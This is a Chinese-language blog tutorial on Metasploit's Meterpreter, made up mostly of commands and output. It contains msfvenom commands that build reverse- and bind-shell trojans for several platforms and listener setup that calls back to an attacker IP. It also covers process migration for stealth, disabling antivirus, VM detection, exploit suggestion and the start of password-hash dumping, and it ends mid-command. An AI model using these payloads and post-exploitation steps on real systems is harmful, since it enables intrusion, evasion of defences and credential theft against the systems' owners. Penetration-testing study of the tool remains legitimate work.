    <published>2020-11-12T14:46:26.000Z</published>
    <updated>2020-12-05T03:24:55.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit–Meterpreter使用"><a href="#Metasploit–Meterpreter使用" class="headerlink" title="Metasploit–Meterpreter使用"></a>Metasploit–Meterpreter使用</h1><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><h3 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h3><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。</p><h3 id="Meterpreter优点"><a href="#Meterpreter优点" class="headerlink" title="Meterpreter优点"></a>Meterpreter优点</h3><ul><li>Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件。</li><li>它在运行的时候系统时间是变化的</li><li>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</li></ul><h3 id="Meterpreter基础常用命令"><a href="#Meterpreter基础常用命令" class="headerlink" title="Meterpreter基础常用命令"></a>Meterpreter基础常用命令</h3><h4 id="进入CMD-shell"><a href="#进入CMD-shell" class="headerlink" title="进入CMD-shell"></a>进入CMD-shell</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4180 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.WEB\Desktop&gt;</span><br></pre></td></tr></table></figure><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h4 id="退出会话"><a href="#退出会话" class="headerlink" title="退出会话"></a>退出会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quit  # 退出会话  </span><br></pre></td></tr></table></figure><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure><h3 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h3><h4 id="msf搜索正向shell与反向shell的payload"><a href="#msf搜索正向shell与反向shell的payload" class="headerlink" title="msf搜索正向shell与反向shell的payload"></a>msf搜索正向shell与反向shell的payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search reverse_tcp或者bind_tcp</span><br></pre></td></tr></table></figure><p>reverse_tcp</p><h4 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><h5 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h5><h5 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h5><p>基于TCP的反弹shell，反向shell是攻击机器不能联通目标机器，目标机器主动连接攻击机器。</p><h6 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.109</span> LPORT=<span class="number">1234</span> R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line">No encoder <span class="keyword">or</span> badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">1114</span> bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost =&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to <span class="number">192.168</span><span class="number">.0</span><span class="number">.108</span>:<span class="number">1234</span>:-  -</span><br><span class="line">[*] Started reverse TCP handler on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击IP  LPORT=监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h5 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h5><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p><h5 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h5><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><h5 id="使用情况-1"><a href="#使用情况-1" class="headerlink" title="使用情况"></a>使用情况</h5><ul><li>目标机器不允许某些端口出站。</li><li>目标机器不能联通外网，但是我们可以联通目标机器。</li></ul><p>目标机器执行木马之后会打开对应的端口，进行shell连接，正向shell就是目标不能连接攻击端，攻击机器主动连接目标机器。</p><h5 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h5><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p><p>设置的IP地址和端口就是目标机的。</p><h6 id="PHP-Shell-1"><a href="#PHP-Shell-1" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马-1"><a href="#EXE-木马-1" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;&lt;Attack Port&gt; -f exe &gt;&#x2F;root&#x2F;bind_xx.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure></li></ul><h3 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h3><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;run post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">msf5&gt;set session 2</span><br><span class="line">msf5&gt;run</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h3 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看会话</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话</span></span><br></pre></td></tr></table></figure><h4 id="将回话保存到后台，进入会话"><a href="#将回话保存到后台，进入会话" class="headerlink" title="将回话保存到后台，进入会话"></a>将回话保存到后台，进入会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session <span class="number">1.</span>..</span><br><span class="line">切换到会话<span class="number">1</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br></pre></td></tr></table></figure><h4 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><h4 id="删除回话"><a href="#删除回话" class="headerlink" title="删除回话"></a>删除回话</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -k 2</span><br><span class="line">[*] <span class="function">Killing the following <span class="title">session</span><span class="params">(s)</span>: 2</span></span><br><span class="line">[*] Killing session 2</span><br><span class="line">[*] <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span> - Meterpreter session <span class="number">2</span> closed.</span><br></pre></td></tr></table></figure><p>抓取hash密码–需要AUTHORITY\SYSTEM权限</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的<strong>第一步就是将其迁移</strong>，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h4 id="查看当前活跃进程"><a href="#查看当前活跃进程" class="headerlink" title="查看当前活跃进程"></a>查看当前活跃进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                          ----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [System Process]</span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                x64   <span class="number">0</span></span><br><span class="line"> <span class="number">124</span>   <span class="number">500</span>   svchost.exe           x64   <span class="number">0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">256</span>   <span class="number">4</span>     smss.exe              x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> <span class="number">340</span>   <span class="number">332</span>   csrss.exe             x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">392</span>   <span class="number">332</span>   wininit.exe           x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> <span class="number">404</span>   <span class="number">384</span>   csrss.exe             x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">440</span>   <span class="number">384</span>   winlogon.exe          x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> <span class="number">500</span>   <span class="number">392</span>   services.exe          x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br></pre></td></tr></table></figure><h4 id="获取当前进程的PID"><a href="#获取当前进程的PID" class="headerlink" title="获取当前进程的PID"></a>获取当前进程的PID</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: <span class="number">1912</span></span><br></pre></td></tr></table></figure><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill &lt;pid值&gt;</span><br></pre></td></tr></table></figure><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br></pre></td></tr></table></figure><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows <span class="number">2008</span> R2 (<span class="number">6.1</span> Build <span class="number">7601</span>, Service Pack <span class="number">1</span>).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : <span class="number">3</span></span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><h5 id="获取软件安装信息"><a href="#获取软件安装信息" class="headerlink" title="获取软件安装信息"></a>获取软件安装信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WEB</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                                                  Version</span><br><span class="line"> ----                                                                                  -------</span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br></pre></td></tr></table></figure><h5 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h5 id="判断是否是虚拟机"><a href="#判断是否是虚拟机" class="headerlink" title="判断是否是虚拟机"></a>判断是否是虚拟机</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h5 id="补丁信息情况与漏洞信息收集"><a href="#补丁信息情况与漏洞信息收集" class="headerlink" title="补丁信息情况与漏洞信息收集"></a>补丁信息情况与漏洞信息收集</h5><p>在拿到一个反弹shell后，可以用metaspolit的内置模块Local Exploit  SuggesterLocal-exploit-suggester，当我们用它来探测某一个系统时，他会告诉我们该系统有哪些exploit可能可以利用。但是由于该工具先是假设一个系统存在所有的相关漏洞，然后根据补丁信息再去排除，所以就导致误报率会高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure><h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/apple/.msf4/loot/<span class="number">20200906182724</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><p>#需要SYSTEM权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line">[*] 